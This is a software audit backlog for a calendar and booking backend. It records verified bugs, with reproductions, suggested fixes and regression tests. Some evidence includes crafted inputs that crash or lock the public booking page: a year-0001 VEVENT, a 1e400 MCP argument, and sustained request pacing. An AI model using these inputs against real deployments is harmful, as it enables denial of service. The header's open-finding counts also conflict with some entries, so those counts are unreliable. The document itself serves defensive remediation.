# Audit backlog

**0 open.** Every finding in this file is closed — all five stages of the
2026-08-25 sweep, the one its own remediation turned up (marked
`· found in remediation`), and every finding from every earlier sweep.

Two of them close on REVIEW rather than on a fix, and say so: the stage 5
test-gap entries had correct subjects and missing coverage, so what landed is
eighteen tests confirmed against four mutations. One ships **verified by hand on
Windows only** — the WinForms dock order — because asserting it needs a realised
control tree and a message loop, and a source-shape pin would read as coverage
without being any.

Findings from the adversarial audit sweeps — one deep finder per subsystem, then
two independent verifiers per finding whose job is to *refute* it. Everything
here **survived verification**: a verifier tried to knock it down and could not.
Nothing here is a style nit — each one carries a concrete trigger.

Everything below the newest sweep is a record rather than a worklist. The
evidence stays: a ticked box says what the bug was, why it mattered, and what a
reader should not reintroduce, and the issues that link into these sections still
resolve.

**Trust the boxes, not the prose.** These counts had drifted badly once already —
the header claimed 36 open findings against a file with no unticked box in it,
because the commit that closed the last one never came back to the top of the
page. `grep -c '\[ \]' docs/AUDIT.md` is the answer, and
`cd backend && python -m pytest -m backlog -rxX` is the executable one.

Severity is the verifiers' rating. `minor` marks a fix that was a few
obviously-correct lines needing no design decision.

### Reading a reference

Each finding is anchored as `` `path:line` (`symbol`) ``. **The symbol is the
anchor; the line is a convenience.** A line number is only true of one commit,
and these have already gone stale twice — the 2026-08-07 refs were written
against that day's tree, then the 2026-08-14 merge moved most of them, and the
2026-08-16 remediation branch moved them again. Every open finding's reference
was re-derived against this commit by locating the symbol it describes, not by
diff arithmetic. If a line drifts again, search the symbol.

Two findings were partly overtaken by that same drift and carried a note saying
so in place of a clean anchor. Both were subsequently re-scoped and closed.

Every reference in the file points into the tree as it was when the finding was
filed. They are history, not navigation — search the symbol, not the line.

Everything is closed: the 2026-08-19 sweep's 66, the 10 filed by the Stage 3
adversarial review and the 4 from its follow-up, the 2026-08-07 backlog, and the
findings the remediation filed against itself (the missing CSP — issue #57 — and
the unbounded `_count_consumed` walk, below).

The 2026-08-07 backlog was closed cluster by cluster, in severity order, against
the seven issues that group it (#42–#48). Each cluster landed as one commit:
source fix, a regression test confirmed to fail against the pre-fix code, and
the tick here. All seven are done — **#45 (auth, session lifetime and request
limits)**, six findings including the sweep's remaining HIGH; **#42 (the
unauthenticated booking write path)**, six plus the `expand_occurrences`
truncation from #44, which is the same defect one layer down; **#46 (frontend
time correctness)**, six including the sweep's other HIGH; **#43 (iCalendar
series editing)**, five; **#44 (recurrence expansion, cache integrity and
startup)**, its remaining five; **#47 (tasks view and bulk add)**, five plus the
one open finding that belonged to no issue; **#48 (untrusted color into the
CSSOM, plus rendering polish)**, six.

The 2026-08-16 sweep was closed in stages (`docs/STAGES.md`), each pinned by
tests that failed until the finding was fixed. **All five stages are done** — the
seven crash paths, the five abuse/exhaustion findings, the seven silent-corruption
ones, the twelve user-visible ones and the nine delivery/test-gap ones, all ticked
below. Those pins are now ordinary regression tests that must stay green.

<!-- Newest first: the 2026-08-25 sweep, then the 2026-08-17 remediation
     finding, then the 2026-08-16 sweep, then 2026-08-07, then the 2026-07 sweep,
     fully ticked. -->

## Sweep — 2026-08-25

A fifth adversarial sweep, and the widest so far: **28 subsystem finders across
five parallel runs, two independent verifiers per finding, 299 agents**. 138 raw
findings, **110 survived verification**, 28 were refuted — a 20% refutation rate.
Every finder ran read-only against a separate copy of the tree with the test
suites installed, so nothing here could touch the working tree, and every claim
below was made against code the agent had actually executed.

Grounded against every section of this file, so nothing here repeats an earlier
sweep. A separate **documentation** run of the same shape read every checkable
assertion in the docs and went to the source to falsify it; its 24 confirmed
drifts are all fixed and are not listed as findings — see the commit
"Correct 24 documentation claims the code no longer supports".

**52 closed, 34 open.** The eight HIGHs are all closed; each was reproduced by
hand with a runnable probe before it was touched, and each carries a regression
test confirmed to fail against the pre-fix tree.

Two things this sweep is honest about rather than quiet about:

* **14 findings were capped off before verification** — from the frontend
  subsystems and the documentation run — because each finder is bounded to its
  most severe results, so these are the ones their own finder ranked LEAST
  severe. They were recovered from the run journal afterwards (the count was
  first reported as 13; the fourteenth was a cross-subsystem duplicate the
  reconciliation surfaced), hand-verified by execution, then put through a
  second adversarial pass of **three skeptics each — 42 agents, none of which
  refuted anything**. All 14 are fixed; see "Follow-up" below. Being ranked low
  was not evidence of being wrong: one of them was the duplicate-key React
  warning that had been printing in the passing test suite the whole time.
* **No finding came back unverified.** Every one got a verdict from both
  skeptics, so nothing below is sitting in the ambiguous middle.

One pattern accounts for a disproportionate share, and it is the same one the
2026-08-19 sweep named: **a guard that exists, is documented, and does not cover
the case beside it.** `--fg-faint` had a contrast rationale and failed the bar.
The mobile block grows the Tasks pane's touch targets and not the Today tab's.
The 16px iOS floor carries two restoring rules explaining why later declarations
beat it, and three later declarations beat it. `ArchivedCalendarsSection`'s
`failed` flag has a comment saying an empty state over a failed fetch is a
confident lie about the account, and three sibling screens tell that lie. And the
test written to stop dialogs forgetting the modal contract enumerates dialogs
that already keep it — so the three that never adopted it were invisible to it.
A guard is only as wide as the set it enumerates.


### Follow-up — the remediation reviewed as a diff

The fixes above were then read as a diff by a review pass, on the argument that a
remediation branch is code like any other and had been graded by nobody. It
found **fourteen defects in the sweep's own work**, of which two were outright
regressions the remediation introduced:

* the `settingsRev` refetch re-ran the whole settings effect, and that effect
  restores the opening tab — so switching tabs on a phone yanked the open desktop
  view to follow it;
* the RDATE flood guard counted a resource's LIFETIME instant list against a
  per-WINDOW cap, so "every weekday for three years" was refused for every
  window, and on the booking path that marks the owner busy for the whole
  query — worse than the flood it was added to stop.

The rest were gaps rather than regressions: a span guard that raised
`AttributeError` on a duplicated DTEND, an `except Exception` broad enough to
evict a cached row on `database is locked`, a modal-contract test that greps a
FILE and so could not see the second dialog in it, an N+1 the batch read was
supposed to have removed still firing for every day with no capacity set.

Two further defects were found by widening the fidelity corpus, which turned out
to be graded against **hard-coded instants**: adding a second event capture made
one test fail and three pass VACUOUSLY, and chasing the third of those found that
`apply_occurrence_override`, `exclude_occurrence` and `shift_series` never
checked that their anchor names an occurrence. `apply_occurrence_override` was
the sharp one — an orphan RECURRENCE-ID is not an inert record, it reads back as
a live occurrence, so "edit this one" against a stale anchor ADDED a meeting and
blocked an hour on the public booking page.

The verifiers earned their keep beyond the verdicts, too: one of them, while
confirming the `--gutter` finding, pointed out that the fix the finding proposed
is defeated by `:root[data-preset="workspace"]` being more specific than a bare
`:root`. It was — the shipped fix reaches the presets because of that note.

And then the fixes themselves were measured, in Chromium at 390x844, because
`docs/AUDIT.md` had already said four times that a mobile rule can be written,
committed and dead. **Two of this sweep's own fixes were dead in the shipped
stylesheet**: the iOS 16px zoom-on-focus floor (`.shut-date` computed to 11px,
`.today-est-input` to 11px, `.shut-reflect` to 14px) and the Today tab's touch
targets (`.today-drop` at 15x16 — the finding's own number, unchanged by its
fix). Both were declared inside `@media (max-width: 720px)` at (0,1,0) and beaten
by a fence ~250 lines below at the same specificity. The comment above the
font-size floor explains that exact mechanism, about the rules it was written to
beat, and then loses to them the same way — the fourth instance of a regression
its own comment calls "the third time this exact regression has shipped".

Both are qualified now (`.input.shut-date`, `button.today-drop`, `.today-est.mono`)
so specificity settles it rather than which block someone appends the next fence
to. `mobile-layout.test.ts` gained the check that generalises: **nothing declared
in a mobile block may be overwritten by a later unconditional rule for the same
selector at the same-or-higher specificity.** It reports all seven dead
declarations against the commit before the fix. Every assertion in that file
before it checked that a declaration EXISTS; none checked that it WINS, which is
why the touch-target test was green while the box it guards measured 15x16.

Everything in this section is fixed, and each fix carries a regression test
confirmed to fail against the commit before it.


### Backend core

#### [x] _overlaps_any re-derives every busy interval's UTC bounds for every candidate slot — quadratic CPU on the unauthenticated booking page, under the global service lock
`backend/tasksd/scheduling.py:334` · **high** · security

`generate_slots` calls `_overlaps_any(slot, blocked)` once per candidate slot, and
`_overlaps_any` walks `blocked` from index 0 converting BOTH ends of every interval it
touches with `_u()` (i.e. `datetime.astimezone`) on every call. Nothing is hoisted and
nothing is indexed, so the work is O(slots x busy-intervals-before-that-slot) with two
ZoneInfo conversions per inner step. `public_link_info` runs this inside
`TaskService._lock` (an RLock held by every other API call, /healthz included) on `GET
/api/public/booking/{token}`, which requires no session; `public_get_limiter` allows 120
requests per 300 s per client /64, so one source can keep the lock occupied
continuously.

<details><summary>Evidence</summary>

```
scheduling.py:332-338:

    s_start, s_end = _u(slot.start), _u(slot.end)
    for b in blocked:
        b_start, b_end = _u(b.start), _u(b.end)
        if b_start >= s_end:
            return False
        if s_start < b_end and s_end > b_start:
            return True

Measured with the real module (America/Chicago, busy = 30-minute meetings synthesised from the owner's calendar, buffer 0):

  link 15 min / horizon 90 d / availability 07:00-22:00 every day, 10 meetings a day
    -> 910 merged busy intervals, 3 640 slots, 2.61 s per request
  link 15 min / horizon 180 d / 00:00-23:59, 12 meetings a day
    -> 2 172 busy intervals, 12 855 slots, 19.49 s per request
  link 5 min / horizon 180 d / 00:00-23:59, 14 meetings a day (all inside the schema bounds the MAX_SLOTS comment cites)
    -> 2 534 busy intervals, 36 755 slots, 67.6 s per request

cProfile on the first case: 5 024 239 `datetime.astimezone` calls, 4.9 s total, 2.73 s of it inside astimezone and 3.79 s cumulative inside `_u`.

Failure scenario: owner publishes a 15-minute link with a 90-day horizon and evening-inclusive availability, and has an ordinary busy calendar. An anonymous client that has the published URL issues GET /api/public/booking/<token> once every 2 s. Each request holds the service RLock for ~2.6 s of pure CPU, so the lock is never free: every authenticated API call, the SSE loop, the background sync and /healthz block behind it for as long as the requests continue. No auth, no rate-limit relief (120/300 s is 0.4 req/s, far more than needed).
```

</details>

**Suggested fix.** Hoist the conversion out of the loop and use the ordering that already exists. `blocked`
is merged, hence disjoint and sorted, and slots are produced in ascending order, so:
compute `bs = [_u(b.start) for b in blocked]` / `be = [_u(b.end) for b in blocked]` once
in `generate_slots` after `pad`, then per slot `i = bisect_left(bs, s_end); overlap = i
> 0 and be[i-1] > s_start`. I verified this against the current implementation on the
three configurations above: identical slot lists, 2.61 s -> 0.012 s, 19.49 s -> 0.040 s,
67.6 s -> 0.097 s.

#### [x] day_range reads SQLite outside the global service lock — two concurrent GET /api/day requests crash the endpoint (and can silently return another day's capacity)
`backend/tasksd/service.py:2350` · **high** · bug

`TaskService` is built on one sqlite3 connection opened with `check_same_thread=False`,
whose entire safety argument is the module docstring's "serializes every access behind a
re-entrant lock" and `store.connect`'s "the service owns ONE connection and serializes
all access behind a lock, so it is safe to touch from FastAPI's threadpool". `day_range`
is the only method in the class that breaks that rule. It closes the `with self._lock:`
block after `store.get_day_range`, then builds the response *outside* the lock:
```python with self._lock: planned = store.get_day_range(self._conn, start, end) # Every
day the map holds is planned by definition ... return [self._day_plan_dto(d, rows, True)
for d, rows in planned.items()] ``` `_day_plan_dto` is not a pure formatter — it runs
`store.get_day_ritual(self._conn, day)` (service.py:1399) and, through
`_effective_capacity`, `store.get_settings(self._conn)` (service.py:1446). So one
request issues **two unserialized queries per planned day** on the shared connection: I
measured 118 unlocked `conn.execute` calls for a 59-day range, and `DAY_RANGE_MAX_DAYS =
190` allows up to 380. Every other `_day_plan_dto` call site (`open_day` at
1519/1531/1569, `set_day_ritual` at 1988) is correctly inside the lock; only 2350 is
not. The route `GET /api/day` dispatches through `_run` (`asyncio.to_thread`), so two
concurrent requests really are two threadpool threads on one connection, and any writer
holding the lock (the background `sync_all` sweep, `open_day`'s `store.tx` BEGIN
IMMEDIATE, a day-entry PATCH) races with them too. It is also an N+1 that the store
already has a batched fix for: `store.get_day_rituals(conn, from_day, to_day)` exists at
store.py:715, is documented as the range twin of `get_day_range` ("a range read of the
plan and a range read of what was said about it have to agree about their bounds"), and
is referenced by **no caller anywhere in the tree** — it was written for this function
and never wired up. `get_settings` is re-read and re-`json.loads`ed once per day for a
value that cannot change during the request. There is no test anywhere that exercises
any service read path under concurrency (`tests/test_concurrency.py` is about two CalDAV
writers; `tests/test_loop_blocking.py` uses a stub service), which is why this shipped.

<details><summary>Evidence</summary>

```
Reproduced against the audit copy, both at the service level and through the real ASGI app.

(1) Instrumented `svc._conn` to record every `execute` where `svc._lock._is_owned()` is false, then called `svc.day_range("2026-01-01", "2026-03-01")` on a DB with 59 planned days each carrying a ritual row:

```
days returned: 59
queries executed WITHOUT holding the service lock: 118
    59 x SELECT * FROM day_ritual WHERE day=?
    59 x SELECT value FROM meta WHERE key=?
```

(2) Four threads calling `svc.day_range("2026-01-01", "2026-06-01")` in a loop on a 150-day DB, no writers at all — fails within seconds, every run:

```
Traceback (most recent call last):
  File ".../tasksd/service.py", line 2350, in day_range
    return [self._day_plan_dto(d, rows, True) for d, rows in planned.items()]
  File ".../tasksd/service.py", line 1399, in _day_plan_dto
    ritual = store.get_day_ritual(self._conn, day)
  File ".../tasksd/db/store.py", line 712, in get_day_ritual
    return conn.execute("SELECT * FROM day_ritual WHERE day=?", (day,)).fetchone()
sqlite3.InterfaceError: bad parameter or other API misuse
```
A second run failed the same way inside `_effective_capacity` -> `store.get_settings`, and a third produced `IndexError('tuple index out of range')` from `_day_plan_dto` reading `ritual["capacity_minutes"]` — i.e. a row built against *another query's* cursor description reached the reader.

CONTROL: the identical script with `with svc._lock:` wrapped around the `day_range` call ran 8 s clean — `errors: [] count: 0`. The lock is the only variable.

(3) Through the real app (`create_app(settings)`, `app.state.service = TaskService(...)`, httpx ASGITransport), six concurrent `GET /api/day?from=2026-01-01&to=2026-06-01` failed on the FIRST round:

```
EXC IndexError('tuple index out of range')
EXC InterfaceError('bad parameter or other API misuse')
failed on round 0
```
The exceptions escape the endpoint entirely (uvicorn -> 500 / torn-down connection).

Concrete failure scenario: owner has the Today tab open in two browser tabs, or the SPA prefetches a week while the month view loads. Both issue `GET /api/day`. Thread A is inside `get_day_ritual`, thread B enters the same cached statement -> one request 500s. The non-crashing variant is worse and silent: a `day_ritual` row fetched for day X can be handed to the reader for day Y, so the Today/week view reports a capacity, `committed_at` or `reflection` belonging to a different day, with no error at all.

The same unlocked loop also races `close()`: `svc.close()` (called on the event loop from the lifespan `finally`)
```

</details>

**Suggested fix.** Move the response construction inside the lock — `with self._lock: planned = ...; return
[self._day_plan_dto(d, rows, True) for d, rows in planned.items()]` — which alone fixes
the crash. While there, kill the N+1 the batch helper was written for: hoist
`store.get_settings` out of the loop (pass it into `_effective_capacity`) and fetch the
rituals once with the already-present `store.get_day_rituals(conn, start, end)`, passing
each day's row into `_day_plan_dto` the way `open_day`/`set_day_ritual` already can. Add
a regression test that runs several `day_range` calls concurrently against one service
(the shape above fails deterministically today), since nothing in the suite currently
asserts the lock discipline for any read path.

#### [x] PATCH event with only `start` (or only `end`) writes a mismatched DTSTART/DTEND value-type pair, silently flips the event to all-day and drops it out of the booking busy set
`backend/tasksd/app.py:886` · **medium** · bug

`EditEvent` has no `all_day` field, and `_event_edit_from_patch` decides each of DTSTART
and DTEND independently by feeding the raw string to `_parse_datelike`, which returns a
`date` for a bare `YYYY-MM-DD` and a `datetime` for anything containing `T`.
`CreateEvent` at least carries an `all_day` flag that `_event_dt` uses to force the DATE
branch; the PATCH model has no equivalent, and nothing downstream re-pairs the two.
`ical.apply_event_changes` writes exactly what it is handed, and `engine._edit` has no
guard (only `ical.shift_series` refuses an all-day<->timed switch, and that is reached
only for `scope="all"` WITH a `recurrence_id`). So a PATCH that names only one of the
two ends leaves the resource with `DTSTART;VALUE=DATE` next to a `DTEND` datetime — an
RFC 5545 §3.6.1 violation ("the value type of DTEND MUST match DTSTART") that other
CalDAV clients writing to the same collection have to cope with, and whose DTEND can now
precede its own DTSTART. The app's own read path then reports `all_day =
bool(dtstart_is_date)` (`service._event_dto`), and `scheduling.busy_intervals` skips
every event with `start_is_date`/`all_day` set — so the event stops contributing any
busy interval and the anonymous booking page will advertise the hour it occupies as
free. The same edge exists on create: `_event_dt(s, all_day=False)` only pins the DATE
branch when `all_day` is true, so `POST .../events
{"start":"2026-04-01","end":"2026-04-01T10:00:00","all_day":false}` is accepted (201)
and writes the same mismatched pair. The SPA does not trigger this (`dragBody` preserves
the shape via `shiftIso`, and EventModal sends both ends together), but the MCP twin
`smylte_update_event` exposes `start`/`end` as independent optional strings with no
`all_day` (tasksd/mcp/tools.py ~line 718, tasksd/mcp/api.py update_event lines 632-635),
so an LLM issuing `smylte_update_event(uid, start="2026-03-12")` on a timed meeting
corrupts it, and any hand-rolled HTTP client hits the route directly. No test in
tests/test_api.py or tests/test_recur.py asserts that DTSTART and DTEND keep matching
value types.

<details><summary>Evidence</summary>

```
backend/tasksd/app.py:876-890

    def _event_edit_from_patch(req: EditEvent) -> EventEdit:
        fs = req.model_fields_set
        ...
        if "start" in fs:
            kw["dtstart"] = _parse_datelike(req.start)   # date OR datetime, per-field
        if "end" in fs:
            kw["dtend"] = _parse_datelike(req.end)

Reproduced end-to-end through the real FastAPI app (TestClient + a stub DAV client, cache seeded with one ordinary timed event `DTSTART:20260310T090000 / DTEND:20260310T100000`):

  busy BEFORE: [Interval(2026-03-10 09:00 America/New_York, 2026-03-10 10:00 America/New_York)]

  PATCH /api/calendars/cal/events/ev1@tasksd  {"start": "2026-03-12"}
  -> 200   all_day: True   end: "2026-03-10T10:00:00"

  resource now on the wire:
    DTSTART;VALUE=DATE:20260312
    DTEND:20260310T100000        <-- different value type, and two days BEFORE the start

  busy AFTER : []               <-- the meeting no longer blocks any booking slot

Create path, same app:
  POST /api/calendars/cal/events {"summary":"Mixed","start":"2026-04-01",
                                  "end":"2026-04-01T10:00:00","all_day":false}
  -> 201  {"start":"2026-04-01","start_is_date":true,
           "end":"2026-04-01T10:00:00","end_is_date":false,"all_day":true}
  wire:  ['DTSTART;VALUE=DATE:20260401', 'DTEND:20260401T100000']

The skip that hides it from the busy set is tasksd/scheduling.py busy_intervals:
    if not ev.get("start") or ev.get("start_is_date") or ev.get("all_day"):
        continue
```

</details>

**Suggested fix.** Pin the pair rather than each field. In `_event_edit_from_patch`, when only one of
`start`/`end` is sent, read the stored event's current `dtstart_is_date` and parse the
sent value in that value type (or refuse a value type that disagrees with the resource,
the way `ical.shift_series` already refuses an all-day<->timed switch with a ValueError
the route maps to 422). When both are sent they must agree with each other. On the
create side, make `_event_dt(..., all_day=False)` reject a bare `YYYY-MM-DD` for either
end (or require `all_day=true` for it), so `all_day` pins both directions instead of
one. Add a regression test asserting that `PATCH {"start": "<bare date>"}` on a timed
event is a 422 and that the event still appears in `busy_intervals` afterwards.

#### [x] pad() overflows on a busy interval near datetime.min — one far-past DURATION-only VEVENT from any CalDAV client permanently 500s the public booking page
`backend/tasksd/scheduling.py:219` · **medium** · security · minor

`pad` widens each busy interval by subtracting the buffer from the UTC instant and then
converting back into the interval's own zone. For an interval at year 1 that conversion
lands before `datetime.min` and raises OverflowError, which nothing on the read path
catches: `busy_intervals`' per-event `try/except` has already returned, `generate_slots`
does not guard, and `app.py` has no OverflowError handler for `GET
/api/public/booking/{token}` (its handlers are RequestValidationError, ConflictError,
SlotTaken, KeyError, DavNotFound, DavAuthError, DavError). Such an event survives
`busy_intervals` only when the link zone's year-1 offset is <= 0 (UTC and every zone in
the Americas — elsewhere `_u()` in the `end > start` guard overflows first and the event
is dropped), and it reaches `_link_busy` for EVERY window because
`store.get_events_in_range` admits a DURATION-only row on `duration IS NOT NULL` alone,
with no lower date bound at all.

<details><summary>Evidence</summary>

```
scheduling.py:214-222:

    b = timedelta(minutes=buffer_minutes)
    return merge([
        Interval((_u(iv.start) - b).astimezone(iv.start.tzinfo),
                 (_u(iv.end) + b).astimezone(iv.end.tzinfo))
        for iv in intervals
    ])

store.py get_events_in_range: "... ELSE dtstart <= ? AND (duration IS NOT NULL OR COALESCE(dtend, dtstart) >= ?) END" — the DURATION branch has no lower bound.

Reproduced end-to-end against the real app (TestClient, seeded TaskService, no Radicale needed). Any other CalDAV client PUTs into one of the owner's event collections:

  BEGIN:VEVENT\r\nUID:ancient\r\nDTSTART:00010101T000000\r\nDURATION:PT1H\r\nEND:VEVENT

cached as dtstart='0001-01-01T00:00:00', duration='PT1H'. Link: timezone America/Chicago, buffer_minutes=15.

  store.get_events_in_range(... '2026-07-12T00:00:00', '2026-07-21T00:00:00') -> ['ancient']
  busy_intervals -> [Interval(0001-01-01 00:00 America/Chicago, 0001-01-01 01:00)]   (_u = 05:50Z, LMT -5:50, so the guard passes)
  GET  /api/public/booking/<tok>       -> 500 Internal Server Error
  POST /api/public/booking/<tok>/book  -> 422 {"detail":"start is out of range"}

Zone matrix (buffer 15): America/Chicago FAIL, UTC FAIL, Europe/Berlin ok, Asia/Tokyo ok. With buffer_minutes=0 `pad` short-circuits to `merge`, which only converts to UTC, so nothing raises — the buffer is the trigger.

Failure scenario: a phone client (or a corrupted sync) writes one year-0001 DURATION event onto any of the owner's calendars. Every visitor to the published booking link gets a 500 from then on, and every booking attempt is refused with "start is out of range" about a start that was perfectly valid. The owner sees nothing wrong in the app and there is no message pointing at the offending event.
```

</details>

**Suggested fix.** Clamp inside `pad` before converting back: compute the padded bounds in UTC and bound
them into a representable range, e.g. `lo = max(_u(iv.start) - b,
datetime.min.replace(tzinfo=timezone.utc) + timedelta(days=2))` and the symmetric
`min(...)` for the end, before `.astimezone(...)`. (Bounding what `busy_intervals` will
accept as a plausible event date would also work, but is a bigger call — clamping keeps
'assume busy' intact.) Worth a regression test: a DURATION-only year-1 event plus a non-
zero buffer must yield slots, not a 500.

#### [x] An availability window whose end falls in a DST spring-forward gap is resolved forward, emitting slots past the owner's declared hours — and in Greenland zones the extra slot lands on the next date and is advertised but unbookable
`backend/tasksd/scheduling.py:291` · **medium** · bug

`generate_slots` builds each day's window with `datetime.combine(day, w_end,
tzinfo=tz)`. When that wall-clock time does not exist (spring-forward gap) PEP 495
fold=0 resolves it with the PRE-transition offset, which is the UTC instant of `w_end +
gap` in post-transition local time. The window therefore GROWS by the gap length rather
than shrinking, and slots are emitted after the owner's stated end. The code comment on
line 288 asserts the opposite ("a spring-forward window shrinks rather than crashing") —
that is true only when the START is in the gap. Where the gap sits in the last hour of
the local day (America/Nuuk, America/Godthab, America/Scoresbysund: on 2026-03-28 the
zone moves -02 -> -01 at 01:00 UTC, so local 23:00:00-23:59:59 never occurs) the over-
run slot's local date is the NEXT day, and `book_slot` re-validates with
`only_day=req.date()` — a different weekday whose availability does not contain it — so
the slot the page just showed is refused. This is deterministic, not a race.

<details><summary>Evidence</summary>

```
scheduling.py:286-292:

        for w_start, w_end in availability.get(day.weekday(), []):
            win = Interval(
                datetime.combine(day, w_start, tzinfo=tz),
                datetime.combine(day, w_end, tzinfo=tz),
            )

service.py book_slot: `slots = scheduling.generate_slots(..., only_day=req.date())` then `raise scheduling.SlotTaken("that time is not available")`.

(a) Advertised-but-unbookable, reproduced through the real service (TaskService + create_booking_link + public_link_info + book_slot, in-memory DB):
  link: timezone America/Nuuk, duration 30, availability {"4": ["18:00-23:30"], "5": ["18:00-23:30"]}, horizon 20, now = 2026-03-20T12:00Z
  public_link_info slots contain {'start': '2026-03-29T00:00:00-01:00', 'end': '2026-03-29T00:30:00-01:00'}
  book_slot(start_iso='2026-03-29T00:00:00-01:00') -> SlotTaken "that time is not available"  (HTTP 409)
  The owner offered Saturday evenings ending 23:30; the page offers 00:00 Sunday, and Sunday has no availability at all.

(b) Same root cause, booked rather than refused (America/Chicago, spring-forward 2026-03-08, availability {"6": ["01:00-02:30"]}, duration 30):
  01:00-06:00 -> 01:00-01:30 -05:00... actual generated slots:
    2026-03-08T01:00:00-06:00 -> 01:30-06:00
    2026-03-08T01:30:00-06:00 -> 2026-03-08T03:00:00-05:00   (renders as a 90-minute slot for a 30-minute link)
    2026-03-08T03:00:00-05:00 -> 2026-03-08T03:30:00-05:00   (entirely outside the declared 01:00-02:30 window)
  Here `req.date()` is still 2026-03-08, so `book_slot` accepts it and an anonymous visitor writes a 03:00 event onto the owner's calendar half an hour past the hours they published.

A brute force over every zone in the tzdata and every day of 2026 finds exactly the three Greenland zones for case (a); case (b) reaches any zone whose gap overlaps a window end.
```

</details>

**Suggested fix.** Resolve the window end explicitly instead of relying on fold=0. After building
`win.end`, detect the gap — `end_utc.astimezone(tz).replace(tzinfo=None) !=
datetime.combine(day, w_end)` — and clamp `end_utc` to the transition instant (the
largest UTC instant whose local value is still <= w_end on `day`). The same treatment
makes the start side explicit rather than incidental. Add a regression test asserting
that (i) no emitted slot's `start.astimezone(tz).date()` differs from the day it was
generated for, and (ii) every slot ends at or before `datetime.combine(day, w_end,
tzinfo=tz)` as an instant — both fail today for America/Nuuk 2026-03-28 with an
18:00-23:30 window.

#### [x] Test gap: no test exercises buffer_minutes across a DST transition — reverting pad() to wall-clock arithmetic passes the entire backend suite
`backend/tests/test_scheduling.py:229` · **medium** · test-gap · stage 5

`pad` carries an explicit comment that it widens the INSTANT rather than the wall clock,
on the one unauthenticated write path into the owner's calendar — but nothing tests it
under a transition. The DST battery (`_dst_slots`, `_fall_back_slots`) hardcodes
`buffer_minutes=0`, and the only non-zero-buffer test (`test_buffer_widens_exclusion`,
line 203) runs on an ordinary July Monday. This is the same shape as the already-closed
'the DST slot battery never supplies busy intervals or a `now` inside the transition'
gap, one field over — and that gap is the reason two slot-math defects survived three
sweeps.

<details><summary>Evidence</summary>

```
tests/test_scheduling.py:226-232 (`_dst_slots`) and 292-297 (`_fall_back_slots`) both pass `buffer_minutes=0`; tests/test_scheduling.py:203-209 is the only non-zero buffer and uses `_slots()` whose default `now` is 2026-07-13.

Mutation proof: with a pytest plugin that replaces `scheduling.pad` with the pre-fix wall-clock version

    Interval(iv.start - b, iv.end + b)

the FULL backend suite passes (`.venv/bin/python -m pytest -q -p no:cacheprovider -p mutate_pad` -> 0 failures). The equivalent mutation of the DURATION path (`advance` -> `start + total`) is caught by two tests, so the gap is specific to `pad`.

What the missing test would catch — America/Chicago, spring-forward 2026-03-08 (02:00 CST -> 03:00 CDT), busy 01:00-01:30 CST, buffer_minutes=120:
  current pad   -> blocked 05:00Z .. 09:30Z
  wall-clock pad-> blocked 05:00Z .. 08:30Z
and with availability Sunday 00:00-06:00, duration 30:
  current slots  -> 09:30Z, 10:00Z, 10:30Z
  regressed slots-> 08:30Z, 09:00Z, 09:30Z, 10:00Z, 10:30Z
The two extra slots sit inside the owner's declared 2-hour buffer and `book_slot` re-validates with the same function, so an anonymous POST would write them onto the calendar.
```

</details>

**Suggested fix.** Parametrize the existing DST batteries over `buffer_minutes` (0 and a non-zero value)
with at least one busy interval supplied, and add a direct `pad` assertion on both
transitions: assert the padded bounds equal `_u(iv.start) - buffer` / `_u(iv.end) +
buffer` compared as instants, not as local values. The spring-forward case above (busy
01:00-01:30 CST, buffer 120, expected block ending 09:30Z) fails against the wall-clock
implementation and passes against the current one.

**Covered by** `test_a_buffer_is_real_time_on_both_sides_of_a_transition` (three cases) and `test_the_buffer_a_spring_forward_slot_list_actually_honours` in `backend/tests/test_backlog_aug25_stage5.py`.

**Closed on REVIEW, not on a fix**, which is what a test-gap finding closes on when its subject turns out to be correct. `pad` already widened the instant rather than the wall clock; the gap was that nothing said so. The tests named above were written, confirmed to fail against the mutation this entry itself proposes (`pad` → `Interval(iv.start - b, iv.end + b)`, which passes the entire rest of the backend suite), and left as ordinary passing tests with no marker — an `xfail(strict=True)` over correct code XPASSes and reds the build the moment it runs.

The assertions compare INSTANTS, not local values: every datetime in the scheduling tests shares one `ZoneInfo` object, and CPython short-circuits `==` to a naive field comparison when `self.tzinfo is other.tzinfo`, so a local comparison would agree with a wall-clock `pad` across the very transition it is written to catch.

**NOT a pin.** `pad` is already correct, so these are ORDINARY PASSING TESTS: an `xfail(strict=True)` over correct code XPASSes and reds the build. Both were confirmed against the audit's own mutation — with `pad`'s body replaced by `Interval(iv.start - b, iv.end + b)`, spring-forward answers 08:30Z instead of 09:30Z, fall-back 09:30Z instead of 08:30Z, and the slot list offers five starts instead of three. The gap is filled; the entry stays open until the sweep is reviewed, like the other 33.

#### [x] A non-finite `position` from the MCP door is persisted into day_plan.position and makes every later read of that day unrenderable
`backend/tasksd/service.py:2275` · **medium** · bug · minor

`patch_day_entry` does `fields["position"] = float(position)` with no finiteness check,
and `store.update_day_entry` writes it straight into the `day_plan.position REAL`
column. Every HTTP door that carries a float is guarded against exactly this —
`Sidecar.sort_order` (app.py:237), `PatchDayEntry.position` (app.py:352, whose comment
reads "a non-finite float parses out of JSON but cannot be serialized back into it, so
one Infinity here would 500 every later read of the whole day"), `CreateHabit.position`
(app.py:393) and `EditHabit.position` (app.py:415) all carry `allow_inf_nan=False`. The
MCP door does not: `smylte_update_day_entry`'s schema declares `"position": {"type":
"number"}` (tools.py:536-537), `mcp/validate.py` implements only
type/enum/min/max/length/pattern, and `McpApi.update_day_entry` (mcp/api.py:1116-1230)
adds no check. `mcp/server.parse_body` rejects the bare `Infinity`/`NaN` literals via
`parse_constant`, but its own comment (server.py:268-270) notes it "does NOT catch 1e400
— that is an ordinary number literal parsed by `parse_float`, which overflows to inf".
That guard was only ever applied to the JSON-RPC `id`, not to tool arguments. SQLite
stores the inf and hands it back, and Starlette/FastAPI's JSONResponse renders with
`allow_nan=False`, so the ValueError is raised during response rendering — outside every
exception handler (the trap server.py:110-118 documents for the `id`). The poison is
persistent: every subsequent GET /api/day/{day}, every GET of a day RANGE containing it,
and every `smylte_get_today` / `smylte_review_day` covering it dies the same way. The
owner cannot repair it from the app, because the HTTP PATCH model refuses the finite→inf
field's replacement path only after the day read has already failed.

<details><summary>Evidence</summary>

```
tools.py:536:  "position": {"type": "number", "description": "Sort key within the day; lower comes first."}
service.py:2274-2275:
        if position is not None:
            fields["position"] = float(position)

Reproduced (backend/.venv/bin/python):
  body = b'{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"x","arguments":{"position":1e400}}}'
  mcp.server.parse_body(body) -> position = inf          (transport accepts it)
